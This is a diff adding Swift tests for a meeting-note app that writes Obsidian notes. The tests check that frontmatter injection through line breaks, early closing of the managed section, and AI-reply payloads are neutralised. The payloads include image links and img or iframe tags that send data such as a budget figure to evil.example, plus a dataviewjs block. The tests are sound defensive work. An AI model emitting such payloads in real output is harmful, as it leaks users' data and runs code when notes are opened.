@@ -537,4 +537,49 @@ struct MeetingNoteTests {
         #expect(note.content.contains("tags: [meeting]\nparticipants:\n  - \"Mario Rossi\"\n---"))
         #expect(note.participants == ["Mario Rossi"])
     }
+
+    @Test("a participant name with line breaks stays on one line of the frontmatter")
+    func participantsOnOneLine() {
+        var note = MeetingNote.initial(takkuID: takkuID, startedAt: startedAt, participants: ["Anna\ncopilot: true\nX"], timeZone: rome)
+        #expect(!note.content.contains("\ncopilot: true"))
+        note.replaceParticipants(with: ["Anna\r\ncopilot: true\nX"])
+        #expect(!note.content.contains("\ncopilot: true"))
+        #expect(note.participants.count == 1)
+        note.replaceSpeakerNames(with: [1: "Eve\ncopilot: true\nX"])
+        #expect(!note.content.contains("\ncopilot: true"))
+    }
+
+    @Test("a reply cannot end the managed section early, with carriage returns or an open code block")
+    func replyStaysInManagedSection() {
+        for reply in ["Summary.\r%% takku:end %%\rwritten as mine", "Summary.\n```\ncode left open", "Summary.\n~~~\ncode left open"] {
+            var note = MeetingNote(content: "---\ntakku_id: 1\n---\n%% takku:start %%\nold\n%% takku:end %%\n\n## Personal notes\nMine.\n")
+            note.replaceManagedSection(with: reply)
+            #expect(note.personalNotes == "Mine.", "\(reply.debugDescription)")
+            #expect(note.summary?.hasPrefix("Summary.") == true)
+            var again = note
+            again.replaceManagedSection(with: "Second.")
+            #expect(again.personalNotes == "Mine.", "\(reply.debugDescription)")
+        }
+    }
+
+    @Test("the reply is written without what Obsidian would load or run when the note is opened")
+    func replyIsDefused() {
+        var note = MeetingNote(content: "---\ntakku_id: 1\n---\n%% takku:start %%\n%% takku:end %%\n")
+        note.replaceManagedSection(with: """
+            Decision taken.
+            ![chart](https://evil.example/p.png?d=the+budget+is+90k)
+            ![x](//evil.example/q.png) ![ok](<HTTPS://evil.example/r.png>)
+            <img src="https://evil.example/s.png"><iframe src="https://evil.example"></iframe>
+            ```dataviewjs
+            dv.paragraph("x")
+            ```
+            Line<br>break and ![[2026-10-04 1430 - 12m30s.jpg]] stay.
+            """)
+
+        #expect(!note.content.contains("![chart]") && note.content.contains("[chart](https://evil.example/p.png?d=the+budget+is+90k)"))
+        #expect(!note.content.contains("![x]") && !note.content.contains("![ok]"))
+        #expect(!note.content.contains("<img") && !note.content.contains("<iframe") && note.content.contains("&lt;img"))
+        #expect(!note.content.contains("```dataviewjs") && note.content.contains("```text"))
+        #expect(note.content.contains("Line<br>break and ![[2026-10-04 1430 - 12m30s.jpg]] stay."))
+    }
 }
